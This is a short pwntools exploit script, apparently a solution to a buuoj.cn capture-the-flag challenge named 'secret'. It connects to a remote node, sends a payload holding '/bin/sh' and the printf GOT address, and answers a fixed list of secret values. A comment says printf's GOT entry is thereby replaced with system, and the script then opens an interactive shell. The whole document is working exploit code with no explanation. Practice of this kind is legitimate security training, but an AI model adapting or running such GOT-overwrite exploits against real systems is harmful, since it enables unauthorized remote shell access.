#coding:utf8
from pwn import *
 
#sh = process('./secret')
sh = remote('node3.buuoj.cn',26618)
elf = ELF('./secret')
printf_got = elf.got['printf']
 
answer = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63]
payload = b'/bin/sh\x00'.ljust(0x10,b'\x00') + p32(printf_got)
sh.sendafter("I give you a secret:",payload)
for x in answer:
   sh.sendlineafter('Secret:',str(x))
#现在printf的got表被修改为了system_plt
#getshell
sh.sendlineafter('Secret:','1')
 
sh.interactive()